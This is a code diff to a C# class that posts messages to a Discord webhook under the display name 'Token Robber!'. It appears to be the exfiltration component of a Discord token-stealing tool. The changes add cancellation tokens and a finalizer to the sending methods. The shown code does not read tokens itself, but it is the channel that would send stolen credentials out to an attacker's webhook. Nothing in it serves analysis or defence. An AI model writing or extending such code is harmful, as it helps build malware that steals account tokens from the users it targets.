@@ -18,15 +18,15 @@ public class DiscordWebhook : IDisposable
 
     }
 
-    public async Task SendMessage(string message)
+    public async Task SendMessage(string message, CancellationToken token = default)
     {
-        using HttpResponseMessage response = await _client.PostAsync(string.Empty, JsonContent.Create(new DiscordMessage(message, "Token Robber!", "https://cdn.discordapp.com/emojis/889939729099943967.png?size=256")));
+        using HttpResponseMessage response = await _client.PostAsync(string.Empty, JsonContent.Create(new DiscordMessage(message, "Token Robber!", "https://cdn.discordapp.com/emojis/889939729099943967.png?size=256")), token);
         response.EnsureSuccessStatusCode();
     }
 
-    public async Task SendMessage<T>(T message) where T : DiscordMessage
+    public async Task SendMessage<T>(T message, CancellationToken token = default) where T : DiscordMessage
     {
-        using HttpResponseMessage response = await _client.PostAsync(string.Empty, JsonContent.Create(message));
+        using HttpResponseMessage response = await _client.PostAsync(string.Empty, JsonContent.Create(message), token);
         response.EnsureSuccessStatusCode();
     }
 
@@ -34,5 +34,10 @@ public class DiscordWebhook : IDisposable
     {
         _client.Dispose();
         GC.SuppressFinalize(this);
+    }
+
+    ~DiscordWebhook()
+    {
+        Dispose();
     }
 }
